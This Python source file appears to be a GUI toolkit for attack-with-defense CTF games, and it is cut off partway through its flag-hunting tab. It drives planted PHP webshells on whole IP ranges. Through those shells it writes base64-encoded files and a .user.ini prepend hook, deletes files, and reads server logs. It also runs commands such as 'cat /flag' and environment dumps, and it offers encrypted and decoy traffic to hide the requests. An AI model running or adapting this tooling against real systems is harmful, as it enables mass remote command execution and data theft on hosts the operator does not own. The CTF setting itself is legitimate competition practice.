#!/usr/bin/env python3
"""
AWD Toolkit v2.0 — 统一管理平台
集成: WAF管理 | Flag获取 | 靶机监控 | 木马上传 | 综合运维
"""
import os, sys, base64, json, ipaddress, time, re, threading, queue, ssl, subprocess
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import requests
import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
import ttkbootstrap as tb
from ttkbootstrap.constants import *
import socket
import hashlib
import shutil
import webbrowser

if getattr(sys, 'frozen', False):
    BASE = sys._MEIPASS
    EXE_DIR = os.path.dirname(sys.executable)
else:
    BASE = os.path.dirname(os.path.abspath(__file__))
    EXE_DIR = BASE
CONFIG_DIR = os.path.join(EXE_DIR, '管理工具')

# ── 公共工具 ──
def _try_add_path(base_path):
    if os.path.exists(os.path.join(base_path, '__init__.py')) or os.path.exists(base_path):
        sys.path.insert(0, base_path)
        return True
    return False

def _ensure_import(module_name, subdirs=None):
    if module_name in sys.modules:
        return sys.modules[module_name]
    meipass = getattr(sys, '_MEIPASS', '')
    candidates = [BASE] + ([meipass] if meipass else [])
    if subdirs:
        candidates = [os.path.join(p, subdirs) for p in candidates]
    for p in candidates:
        if os.path.isdir(p) or os.path.exists(os.path.join(os.path.dirname(p), module_name + '.py')):
            if p not in sys.path:
                sys.path.insert(0, p)
            break
    return __import__(module_name)

def _session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    return s

def make_base(ip, port, https):
    proto = 'https' if https else 'http'
    if https and port == 443: return f'{proto}://{ip}'
    if not https and port == 80: return f'{proto}://{ip}'
    return f'{proto}://{ip}:{port}'

def parse_targets(raw):
    ips = []
    if not raw: return ips
    for s in re.split(r'[,\s\n]+', raw):
        s = s.strip()
        if not s: continue
        try:
            for h in ipaddress.ip_network(s, strict=False).hosts(): ips.append(str(h))
        except (ValueError, TypeError):
            ips.append(s)
    return ips

def safe_int(val, default=0):
    try: return int(val)
    except (ValueError, TypeError): return default

def atomic_write(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as f: f.write(data)
    if os.name == 'nt':
        if os.path.exists(path): os.remove(path)
    os.replace(tmp, path)

def async_run(target, daemon=True):
    threading.Thread(target=target, daemon=daemon).start()

def pick_dir(entry):
    p = filedialog.askdirectory()
    if p: entry.delete(0, tk.END); entry.insert(0, p)

def pick_file(entry):
    p = filedialog.askopenfilename()
    if p: entry.delete(0, tk.END); entry.insert(0, p)

# ── 共享日志组件 ──
class LogWidget:
    def __init__(self, parent, height=None):
        self.text = scrolledtext.ScrolledText(parent, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', insertbackground='white', state=tk.DISABLED, height=height)
        self.text.pack(fill=tk.BOTH, expand=True)
        for t, c in [('ok','#4EC9B0'),('fail','#f44747'),('info','#569CD6'),('warn','#dcdcaa'),('title','#c586c0'),('out','#d4d4d4')]:
            self.text.tag_config(t, foreground=c)
        self.search_var = tk.StringVar()
        self._search_visible = False

    def log(self, msg, tag='info'):
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, msg + '\n', tag)
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)

    def clear(self):
        self.text.config(state=tk.NORMAL)
        self.text.delete('1.0', tk.END)
        self.text.config(state=tk.DISABLED)

    def add_search_bar(self, parent):
        f = tb.Frame(parent)
        tb.Label(f, text='搜索:').pack(side=tk.LEFT)
        e = tb.Entry(f, textvariable=self.search_var, width=20)
        e.pack(side=tk.LEFT, padx=2)
        tb.Button(f, text='🔍', command=self._do_search, width=3).pack(side=tk.LEFT)
        tb.Button(f, text='✕', command=self._clear_search, width=3).pack(side=tk.LEFT)
        return f

    def _do_search(self):
        kw = self.search_var.get().strip()
        if not kw: return
        self.text.config(state=tk.NORMAL)
        self.text.tag_remove('search', '1.0', tk.END)
        pos = '1.0'
        count = 0
        while True:
            pos = self.text.search(kw, pos, tk.END, nocase=True)
            if not pos: break
            end = f'{pos}+{len(kw)}c'
            self.text.tag_add('search', pos, end)
            self.text.tag_config('search', background='#e06c00', foreground='white')
            pos = end
            count += 1
        self.text.config(state=tk.DISABLED)
        if not count: self.log(f'未找到: {kw}', 'warn')

    def _clear_search(self):
        self.search_var.set('')
        self.text.tag_remove('search', '1.0', tk.END)


# ============================================================
#  Tab 1: WAF 管理 (修复: 裸except + 线程清理)
# ============================================================
WAF_FILE = os.path.join(BASE, '上传靶机', 'waf_strong.php')
DAT_FILE = os.path.join(BASE, '上传靶机', '.waf.dat')

class WafTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.results = []
        self._threads = []
        self.cfg = self.load_config()
        self.build_ui()

    def load_config(self):
        p = os.path.join(CONFIG_DIR, 'waf_gui_config.json')
        d = {'shell_url': '/shell.php', 'shell_pass': 'y|lladmin121.@ss', 'port': 80,
             'https': False, 'threads': 20, 'timeout': 10, 'retry': 2}
        try:
            if os.path.exists(p):
                with open(p, 'r', encoding='utf-8') as f: d.update(json.load(f))
        except Exception: pass
        return d

    def save_config(self):
        self.cfg.update({
            'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(),
            'port': int(self.e_port.get()), 'https': self.v_https.get(),
            'threads': int(self.e_threads.get()), 'timeout': int(self.e_timeout.get()),
            'retry': int(self.e_retry.get()),
        })
        try:
            os.makedirs(CONFIG_DIR, exist_ok=True)
            atomic_write(os.path.join(CONFIG_DIR, 'waf_gui_config.json'), json.dumps(self.cfg, ensure_ascii=False, indent=2))
        except Exception: pass

    def build_ui(self):
        f = tb.Frame(self.parent)
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        top = tb.LabelFrame(f, text='目标配置', padding=6)
        top.pack(fill=tk.X)
        r0 = tb.Frame(top); r0.pack(fill=tk.X, pady=2)
        tb.Label(r0, text='Webshell路径:').pack(side=tk.LEFT)
        self.e_shell_url = tb.Entry(r0, width=18)
        self.e_shell_url.insert(0, self.cfg['shell_url']); self.e_shell_url.pack(side=tk.LEFT, padx=2)
        tb.Label(r0, text='密码:').pack(side=tk.LEFT, padx=(8,0))
        self.e_shell_pass = tb.Entry(r0, width=16, show='*')
        self.e_shell_pass.insert(0, self.cfg['shell_pass']); self.e_shell_pass.pack(side=tk.LEFT, padx=2)
        tb.Button(r0, text='\U0001f441', command=self.toggle_pass, width=3).pack(side=tk.LEFT)
        tb.Label(r0, text='端口:').pack(side=tk.LEFT, padx=(8,0))
        self.e_port = tb.Entry(r0, width=6); self.e_port.insert(0, str(self.cfg['port']))
        self.e_port.pack(side=tk.LEFT, padx=2)
        self.v_https = tk.BooleanVar(value=self.cfg['https'])
        tb.Checkbutton(r0, text='HTTPS', variable=self.v_https).pack(side=tk.LEFT, padx=4)
        tb.Label(r0, text='并发:').pack(side=tk.LEFT, padx=(8,0))
        self.e_threads = tb.Entry(r0, width=5); self.e_threads.insert(0, str(self.cfg['threads']))
        self.e_threads.pack(side=tk.LEFT, padx=2)
        tb.Label(r0, text='超时:').pack(side=tk.LEFT, padx=(8,0))
        self.e_timeout = tb.Entry(r0, width=4); self.e_timeout.insert(0, str(self.cfg['timeout']))
        self.e_timeout.pack(side=tk.LEFT, padx=2)
        tb.Label(r0, text='重试:').pack(side=tk.LEFT, padx=(8,0))
        self.e_retry = tb.Entry(r0, width=3); self.e_retry.insert(0, str(self.cfg['retry']))
        self.e_retry.pack(side=tk.LEFT, padx=2)
        mid = tb.LabelFrame(f, text='目标与操作', padding=6)
        mid.pack(fill=tk.X, pady=4)
        r1 = tb.Frame(mid); r1.pack(fill=tk.X)
        tb.Label(r1, text='IP/网段/文件:').pack(side=tk.LEFT)
        self.e_target = tb.Entry(r1)
        self.e_target.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1, text='\U0001f4c2 浏览', command=self.browse_file).pack(side=tk.LEFT)
        r2 = tb.Frame(mid); r2.pack(fill=tk.X, pady=4)
        self.btn_deploy = tb.Button(r2, text='\u25b6 部署WAF', command=lambda: self.start('deploy'))
        self.btn_deploy.pack(side=tk.LEFT, padx=2)
        self.btn_check = tb.Button(r2, text='\U0001f50d 检查状态', command=lambda: self.start('check'))
        self.btn_check.pack(side=tk.LEFT, padx=2)
        self.btn_update = tb.Button(r2, text='\U0001f504 更新WAF', command=lambda: self.start('update'))
        self.btn_update.pack(side=tk.LEFT, padx=2)
        self.btn_remove = tb.Button(r2, text='\u274c 卸载WAF', command=lambda: self.start('remove'))
        self.btn_remove.pack(side=tk.LEFT, padx=2)
        self.btn_stop_waf = tb.Button(r2, text='\u23f9 停止', command=self.stop)
        self.btn_stop_waf.pack(side=tk.LEFT, padx=10)
        # ── 高级子标签页 ──
        bot_nb = tb.Notebook(f)
        bot_nb.pack(fill=tk.BOTH, expand=True, pady=(4,0))

        # 子页1: 执行日志
        bot_log = tb.Frame(bot_nb); bot_nb.add(bot_log, text='  \U0001f4dd 执行日志  ')
        self.log_w = LogWidget(bot_log)
        sf = self.log_w.add_search_bar(bot_log)
        sf.pack(fill=tk.X, pady=2)

        # 子页2: 规则编辑
        bot_rule = tb.Frame(bot_nb); bot_nb.add(bot_rule, text='  \U0001f4c4 规则编辑  ')
        tb.Label(bot_rule, text='编辑 WAF 规则内容 (保存后需重新部署):', font=('微软雅黑', 9)).pack(anchor=tk.W, padx=4, pady=2)
        r_top = tb.Frame(bot_rule); r_top.pack(fill=tk.X, padx=4)
        self.btn_load_rules = tb.Button(r_top, text='\U0001f4c2 加载当前规则', command=self.load_rules, width=14)
        self.btn_load_rules.pack(side=tk.LEFT, padx=2)
        self.btn_save_rules = tb.Button(r_top, text='\U0001f4be 保存规则', command=self.save_rules, bootstyle='success', width=12)
        self.btn_save_rules.pack(side=tk.LEFT, padx=2)
        self.rule_text = tk.Text(bot_rule, font=('Consolas', 9), bg='#1e1e1e', fg='#d4d4d4',
            insertbackground='white', height=8, wrap=tk.WORD, bd=0, highlightthickness=1, highlightcolor='#30363d')
        self.rule_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)

        # 子页3: 攻击流量
        bot_traf = tb.Frame(bot_nb); bot_nb.add(bot_traf, text='  \U0001f4e1 攻击流量  ')
        trf_top = tb.Frame(bot_traf); trf_top.pack(fill=tk.X, padx=4, pady=2)
        self.btn_traf = tb.Button(trf_top, text='\U0001f50d 获取攻击日志', command=self.fetch_traffic, width=16)
        self.btn_traf.pack(side=tk.LEFT, padx=2)
        tb.Label(trf_top, text='日志路径:').pack(side=tk.LEFT, padx=(8,0))
        self.e_logpath = tb.Entry(trf_top, width=30)
        self.e_logpath.insert(0, '/var/log/nginx/access.log')
        self.e_logpath.pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
        self.traf_text = scrolledtext.ScrolledText(bot_traf, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', height=8, state=tk.DISABLED)
        self.traf_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        for t, c in [('ip','#f44747'),('info','#d4d4d4'),('cnt','#4ec9b0')]:
            self.traf_text.tag_config(t, foreground=c)

        # 子页4: 心跳监控
        bot_hb = tb.Frame(bot_nb); bot_nb.add(bot_hb, text='  \u2764\ufe0f 心跳监控  ')
        hb_top = tb.Frame(bot_hb); hb_top.pack(fill=tk.X, padx=4, pady=2)
        self.hb_running = False
        self.btn_hb = tb.Button(hb_top, text='\u25b6 开始心跳', command=self.toggle_heartbeat, width=14)
        self.btn_hb.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_top, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.hb_interval = tb.Entry(hb_top, width=4); self.hb_interval.insert(0, '30'); self.hb_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(hb_top, text='秒').pack(side=tk.LEFT)
        self.hb_lbl = tb.Label(hb_top, text='\u23f8 未启动', foreground='#8b949e')
        self.hb_lbl.pack(side=tk.LEFT, padx=12)
        self.hb_text = scrolledtext.ScrolledText(bot_hb, font=('Consolas', 9), bg='#1e1e1e',
            fg='#d4d4d4', height=8, state=tk.DISABLED)
        self.hb_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=2)
        for t, c in [('alive','#3fb950'),('dead','#f85149'),('info','#d4d4d4')]:
            self.hb_text.tag_config(t, foreground=c)

    def toggle_pass(self):
        self.e_shell_pass.config(show='' if self.e_shell_pass.cget('show') == '*' else '*')

    def browse_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件', filetypes=[('Text', '*.txt'), ('All', '*.*')])
        if p: self.e_target.delete(0, tk.END); self.e_target.insert(0, p)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_deploy, self.btn_check, self.btn_update, self.btn_remove, self.btn_stop_waf):
            b.config(state=st)

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def load_targets(self):
        raw = self.e_target.get().strip()
        if not raw: messagebox.showwarning('警告', '请先输入目标IP或选择IP文件'); return None
        if os.path.isfile(raw):
            try:
                with open(raw, 'r') as f: lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                self.log_self(f'从文件加载到 {len(lines)} 个目标', 'info')
                return lines
            except Exception as e: messagebox.showerror('错误', f'读取文件失败: {e}'); return None
        ips = parse_targets(raw)
        if ips: self.log_self(f'解析到 {len(ips)} 个目标', 'info'); return ips
        messagebox.showwarning('警告', '未解析到有效目标'); return None

    def start(self, action):
        if self.running: messagebox.showinfo('提示', '正在执行中'); return
        targets = self.load_targets()
        if not targets: return
        self.running = True; self.set_btns(False); self.save_config()
        acts = {'deploy': ('部署', self.deploy_one), 'remove': ('卸载', self.remove_one),
                'check': ('检查', self.check_one), 'update': ('更新', self.deploy_one)}
        desc, func = acts[action]
        self.log_self(f'{"="*50}', 'title')
        self.log_self(f'  {desc} WAF Strong 到 {len(targets)} 台靶机', 'title')
        self.log_self(f'{ "="*50}', 'title')
        self.results = []
        async_run(lambda: self.run_batch(targets, func, desc))

    def run_batch(self, targets, func, desc):
        ok = fail = 0
        cfg = {'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(),
               'port': int(self.e_port.get()), 'https': self.v_https.get(),
               'timeout': int(self.e_timeout.get()), 'retry': int(self.e_retry.get())}
        with ThreadPoolExecutor(max_workers=min(int(self.e_threads.get()), len(targets))) as ex:
            fs = {ex.submit(func, ip, cfg): ip for ip in targets}
            for f in as_completed(fs):
                if not self.running: break
                ip, success, msg = f.result()
                tag = 'ok' if success else 'fail'
                if isinstance(msg, dict):
                    parts = ' | '.join(f'{k}={v}' for k, v in msg.items())
                    self.log_self(f'  {"[OK]" if success else "[FAIL]"} {ip:15s} {parts}', tag)
                else: self.log_self(f'  {"[OK]" if success else "[FAIL]"} {ip:15s} {msg}', tag)
                ok += int(success); fail += int(not success)
                self.results.append((ip, success, msg))
        self.log_self(f'  结果: {ok} 成功, {fail} 失败 / 共 {len(targets)}', 'ok' if ok >= fail else 'fail')
        self.running = False; self.set_btns(True)

    def deploy_one(self, ip, cfg):
        base = make_base(ip, cfg['port'], cfg['https'])
        for attempt in range(cfg['retry'] + 1):
            try:
                s = _session()
                r = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo "ALIVE"'}, timeout=cfg['timeout'])
                if 'ALIVE' not in r.text:
                    if attempt < cfg['retry']: time.sleep(0.5); continue
                    return ip, False, 'Webshell无响应'
                with open(WAF_FILE, 'r', encoding='utf-8') as f: waf = f.read()
                with open(DAT_FILE, 'r', encoding='utf-8') as f: dat = f.read()
                b64_waf = base64.b64encode(waf.encode()).decode()
                b64_dat = base64.b64encode(dat.encode()).decode()
                for cmd, tag in [(f"file_put_contents('/.waf_strong.php', base64_decode('{b64_waf}'))", 'WAF'),
                                 (f"file_put_contents('/.waf.dat', base64_decode('{b64_dat}'))", 'DAT'),
                                 (f"file_put_contents('/.user.ini', 'auto_prepend_file=/.waf_strong.php\\n')", 'INI')]:
                    s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: cmd}, timeout=cfg['timeout'])
                    time.sleep(0.1)
                time.sleep(0.3)
                r2 = s.get(f'{base}/.waf_strong.php', timeout=cfg['timeout'])
                if r2.status_code in (200, 403): return ip, True, '部署成功'
                r3 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo file_exists("/.waf_strong.php")?"1":"0";'}, timeout=cfg['timeout'])
                if '1' in r3.text: return ip, True, '部署成功(文件确认)'
                return ip, False, '验证失败'
            except Exception as e:
                if attempt < cfg['retry']: time.sleep(1); continue
                return ip, False, str(e)[:60]
        return ip, False, '重试耗尽'

    def remove_one(self, ip, cfg):
        base = make_base(ip, cfg['port'], cfg['https'])
        try:
            s = _session()
            s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: "@unlink('/.waf_strong.php');@unlink('/.waf.dat');@unlink('/.user.ini');echo 'OK';"}, timeout=cfg['timeout'])
            return ip, True, '卸载完成'
        except Exception as e: return ip, False, str(e)[:50]

    def check_one(self, ip, cfg):
        base = make_base(ip, cfg['port'], cfg['https'])
        status = {}
        try:
            s = _session()
            r = s.get(f'{base}/.waf_strong.php', timeout=cfg['timeout'])
            if r.status_code == 403: status['WAF'] = '在线'
            elif r.status_code == 200 and ('WAF' in r.text or 'Blocked' in r.text): status['WAF'] = '在线'
            else: status['WAF'] = f'异常({r.status_code})'
            r2 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'ls -la /.waf_strong.php /.waf.dat /.user.ini 2>&1'}, timeout=cfg['timeout'])
            out = r2.text
            if '/.waf_strong.php' in out:
                status['File'] = '存在'
                for line in out.split('\n'):
                    if '/.waf_strong.php' in line:
                        parts = line.split()
                        if len(parts) > 4: status['Size'] = parts[4] + 'B'; break
            else: status['File'] = '缺失'
            status['Rules'] = '存在' if '/.waf.dat' in out else '缺失'
            status['INI'] = '已配' if ('/.user.ini' in out or 'auto_prepend_file' in out) else '未配'
            r3 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo "[SHELL_OK]"'}, timeout=cfg['timeout'])
            status['Shell'] = '正常' if '[SHELL_OK]' in r3.text else '异常'
            return ip, True, status
        except Exception as e: return ip, False, {'error': str(e)[:50]}

    def stop(self):
        self.running = False
        self.log_self('用户请求停止', 'warn')

    # ── 规则编辑 ──
    def load_rules(self):
        for p in [DAT_FILE, os.path.join(BASE, '管理工具', '.waf.dat'), os.path.join(BASE, '.waf.dat')]:
            if os.path.exists(p):
                try:
                    with open(p, 'r', encoding='utf-8') as f:
                        content = f.read()
                    self.rule_text.delete('1.0', tk.END)
                    self.rule_text.insert('1.0', content)
                    self.log_self(f'已加载规则: {p}', 'info')
                    return
                except Exception as e: self.log_self(f'加载失败: {e}', 'fail')
        self.log_self('未找到 .waf.dat 规则文件，请在编辑器中手动输入', 'warn')

    def save_rules(self):
        content = self.rule_text.get('1.0', tk.END).strip()
        if not content: messagebox.showwarning('提示', '规则内容为空'); return
        p = filedialog.asksaveasfilename(defaultextension='.dat', initialfile='.waf.dat',
            filetypes=[('DAT', '*.dat'), ('All', '*.*')])
        if p:
            try:
                with open(p, 'w', encoding='utf-8') as f: f.write(content)
                self.log_self(f'规则已保存: {p} (需重新部署到靶机)', 'ok')
            except Exception as e: self.log_self(f'保存失败: {e}', 'fail')

    # ── 攻击流量 ──
    def fetch_traffic(self):
        targets = self.load_targets()
        if not targets: return
        log_path = self.e_logpath.get().strip() or '/var/log/nginx/access.log'
        shell_url = self.e_shell_url.get().strip()
        shell_pass = self.e_shell_pass.get().strip()
        port = int(self.e_port.get() or 80)
        https = self.v_https.get()
        timeout = int(self.e_timeout.get() or 10)
        self.traf_text.config(state=tk.NORMAL)
        self.traf_text.delete('1.0', tk.END)
        self.traf_text.insert(tk.END, f'>>> 获取攻击日志: {log_path}\n\n', 'info')
        self.traf_text.config(state=tk.DISABLED)
        ip_counter = {}

        def log_traf(msg, tag='info'):
            self.root.after(0, lambda: (
                self.traf_text.config(state=tk.NORMAL),
                self.traf_text.insert(tk.END, msg + '\n', tag),
                self.traf_text.see(tk.END),
                self.traf_text.config(state=tk.DISABLED)
            ))

        def run():
            for ip in targets[:5]:
                try:
                    base = make_base(ip, port, https)
                    s = _session()
                    cmd = f'tail -200 {log_path} 2>/dev/null || echo "NO_LOG"'
                    r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=timeout)
                    if 'NO_LOG' in r.text:
                        log_traf(f'[{ip}] 日志文件不存在', 'info')
                        continue
                    # Parse IPs from log
                    ips_found = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', r.text)
                    for i in ips_found:
                        if i != ip: ip_counter[i] = ip_counter.get(i, 0) + 1
                    log_traf(f'[{ip}] 解析到 {len(ips_found)} 条请求, {len(set(ips_found))} 个来源', 'info')
                except Exception as e:
                    log_traf(f'[{ip}] 失败: {e}', 'info')
            # Top attackers
            log_traf('', 'info')
            log_traf('══════ 攻击者 TOP 10 ══════', 'info')
            for i, (attacker, cnt) in enumerate(sorted(ip_counter.items(), key=lambda x: -x[1])[:10], 1):
                log_traf(f'  #{i:<3} {attacker:<16} ({cnt} 次)', 'ip')
        threading.Thread(target=run, daemon=True).start()

    # ── 心跳监控 ──
    def toggle_heartbeat(self):
        if self.hb_running:
            self.hb_running = False
            self.btn_hb.config(text='\u25b6 开始心跳')
            self.hb_lbl.config(text='\u23f8 已停止', foreground='#8b949e')
            return
        targets = self.load_targets()
        if not targets: return
        self.hb_running = True
        self.btn_hb.config(text='\u23f9 停止心跳')
        interval = max(5, int(self.hb_interval.get() or 30))
        self.hb_lbl.config(text=f'\u23f3 监控 {len(targets)} 台', foreground='#3fb950')

        def hb_log(msg, tag='info'):
            self.root.after(0, lambda: (
                self.hb_text.config(state=tk.NORMAL),
                self.hb_text.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag),
                self.hb_text.see(tk.END),
                self.hb_text.config(state=tk.DISABLED)
            ))

        def run():
            shell_url = self.e_shell_url.get().strip()
            shell_pass = self.e_shell_pass.get().strip()
            port = int(self.e_port.get() or 80)
            https = self.v_https.get()
            timeout = int(self.e_timeout.get() or 10)
            while self.hb_running:
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(targets))) as ex:
                    def check(ip):
                        try:
                            base = make_base(ip, port, https)
                            r = _session().post(f'{base}{shell_url}',
                                data={shell_pass: 'echo "ALIVE"'}, timeout=timeout)
                            return ip, 'ALIVE' in r.text
                        except Exception: return ip, False
                    fs = {ex.submit(check, ip): ip for ip in targets}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok: alive += 1
                        else: dead += 1
                hb_log(f'存活: {alive}/{len(targets)}  死亡: {dead}', 'alive' if alive>dead else 'dead')
                self.root.after(0, lambda a=alive, d=dead: self.hb_lbl.config(
                    text=f'\U0001f7e2 {a}/{len(targets)}  \U0001f534 {d}', foreground='#3fb950' if a>d else '#f85149'))
                for _ in range(interval):
                    if not self.hb_running: break
                    time.sleep(1)
            hb_log('心跳监控已停止', 'info')
        threading.Thread(target=run, daemon=True).start()


# ============================================================
#  Tab 2: Flag 获取 (修复: 裸except + 原子写入)
# ============================================================
FLAG_PATTERN = re.compile(r'flag\{[^}]+\}', re.I)
FLAG_KNOWN_FILE = os.path.join(EXE_DIR, '攻击模块', 'known_flags.json')

class FlagTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.stop_flag = threading.Event()
        self.known = set()
        self.total_submitted = 0
        self.load_known()
        self.cfg_file = os.path.join(EXE_DIR, '攻击模块', 'flag_hunter_config.json')
        self.DEFAULT_CMDS = ['cat /flag', 'cat /flag.txt', 'cat /root/flag', 'env 2>/dev/null | grep -i flag', 'type flag.txt']
        self.build_ui()
        self.load_config()

    def load_known(self):
        if os.path.exists(FLAG_KNOWN_FILE):
            try:
                with open(FLAG_KNOWN_FILE) as f: self.known = set(json.load(f))
                self.log(f'加载 {len(self.known)} 个历史Flag (自动去重)', 'info')
            except Exception: pass

    def save_known(self):
        try:
            atomic_write(FLAG_KNOWN_FILE, json.dumps(list(self.known)))
        except Exception: pass

    def build_ui(self):
        f = tb.Frame(self.parent)
        f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        pad = {'padx': 4, 'pady': 2}
        f1 = tb.LabelFrame(f, text='目标 IP'); f1.pack(fill=tk.X, **pad)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, **pad)
        tb.Label(r1, text='CIDR / 逗号分隔:').pack(side=tk.LEFT)
        self.entry_ip = tb.Entry(r1); self.entry_ip.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1, text='\U0001f4c2 导入文件', command=self.load_file).pack(side=tk.LEFT)
        tb.Label(r1, text='排除自身:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_self = tb.Entry(r1, width=14); self.entry_self.pack(side=tk.LEFT, padx=2)
        f2 = tb.LabelFrame(f, text='Webshell 配置'); f2.pack(fill=tk.X, **pad)
        r2 = tb.Frame(f2); r2.pack(fill=tk.X, **pad)
        tb.Label(r2, text='路径:').pack(side=tk.LEFT)
        self.entry_shell = tb.Entry(r2, width=16)
        self.entry_shell.insert(0, '/shell.php'); self.entry_shell.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='密码:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_pass = tb.Entry(r2, width=12); self.entry_pass.insert(0, 'cmd')
        self.entry_pass.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='端口:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_port = tb.Entry(r2, width=5); self.entry_port.insert(0, '80')
        self.entry_port.pack(side=tk.LEFT, padx=2)
        self.v_https_flag = tk.BooleanVar()
        tb.Checkbutton(r2, text='HTTPS', variable=self.v_https_flag).pack(side=tk.LEFT, padx=4)
        tb.Label(r2, text='超时:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_timeout = tb.Entry(r2, width=3); self.entry_timeout.insert(0, '5')
        self.entry_timeout.pack(side=tk.LEFT, padx=2)
        tb.Label(r2, text='秒').pack(side=tk.LEFT)
        f3 = tb.LabelFrame(f, text='执行命令'); f3.pack(fill=tk.X, **pad)
        r3 = tb.Frame(f3); r3.pack(fill=tk.X, **pad)
        self.cmd_text = tk.Text(r3, height=3, relief=tk.FLAT, highlightthickness=0, borderwidth=0, font=('Consolas', 9))
        self.cmd_text.pack(fill=tk.X, side=tk.LEFT, expand=True)
        self.cmd_text.insert('1.0', '\n'.join(self.DEFAULT_CMDS))
        b3 = tb.Frame(r3); b3.pack(side=tk.LEFT, padx=4)
        tb.Button(b3, text='重置默认', command=self.reset_cmds).pack(pady=2)
        f_rsa = tb.LabelFrame(f, text='RSA加密 + 混淆流量'); f_rsa.pack(fill=tk.X, **pad)
        rr = tb.Frame(f_rsa); rr.pack(fill=tk.X, **pad)
        self.v_rsa = tk.BooleanVar()
        tb.Checkbutton(rr, text='启用RSA加密通信', variable=self.v_rsa).pack(side=tk.LEFT, padx=2)
        self.v_mix = tk.BooleanVar()
        tb.Checkbutton(rr, text='启用混淆流量(万假一真)', variable=self.v_mix).pack(side=tk.LEFT, padx=8)
        tb.Label(rr, text='混淆数:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_fake = tb.Entry(rr, width=3); self.entry_fake.insert(0, '8')
        self.entry_fake.pack(side=tk.LEFT, padx=2)
        tb.Label(rr, text='RSA Agent(可选):').pack(side=tk.LEFT, padx=(6,0))
        self.entry_rsa_agent = tb.Entry(rr, width=24)
        self.entry_rsa_agent.pack(side=tk.LEFT, padx=2)
        f4 = tb.LabelFrame(f, text='提交配置'); f4.pack(fill=tk.X, **pad)
        r4 = tb.Frame(f4); r4.pack(fill=tk.X, **pad)
        tb.Label(r4, text='提交URL(多行):').pack(side=tk.LEFT)
        self.entry_submit = tb.Entry(r4); self.entry_submit.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        tb.Label(r4, text='Token:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_token = tb.Entry(r4, width=18); self.entry_token.pack(side=tk.LEFT, padx=2)
        self.no_submit_var = tk.BooleanVar()
        tb.Checkbutton(r4, text='仅扫描不提交', variable=self.no_submit_var).pack(side=tk.LEFT, padx=4)
        tb.Button(r4, text='测试提交', command=self.test_submit).pack(side=tk.LEFT)
        r_ctrl = tb.Frame(f); r_ctrl.pack(fill=tk.X, **pad)
        self.btn_start_flag = tb.Button(r_ctrl, text='\u25b6 开始', command=self.start_hunt)
        self.btn_start_flag.pack(side=tk.LEFT, padx=2)
        self.btn_stop_flag = tb.Button(r_ctrl, text='\u23f9 停止', command=self.stop_hunt, state=tk.DISABLED)
        self.btn_stop_flag.pack(side=tk.LEFT, padx=2)
        tb.Label(r_ctrl, text='轮询间隔:').pack(side=tk.LEFT, padx=(12,0))
        self.entry_interval = tb.Entry(r_ctrl, width=4); self.entry_interval.insert(0, '30')
        self.entry_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(r_ctrl, text='秒').pack(side=tk.LEFT)
        tb.Label(r_ctrl, text='线程:').pack(side=tk.LEFT, padx=(6,0))
        self.entry_threads = tb.Entry(r_ctrl, width=4); self.entry_threads.insert(0, '50')
        self.entry_threads.pack(side=tk.LEFT, padx=2)
        r_stat = tb.Frame(f); r_stat.pack(fill=tk.X, **pad)
        self.lbl_targets = tb.Label(r_stat, text='目标: 0'); self.lbl_targets.pack(side=tk.LEFT, padx=4)
        self.lbl_round = tb.Label(r_stat, text='轮次: 0'); self.lbl_round.pack(side=tk.LEFT, padx=4)
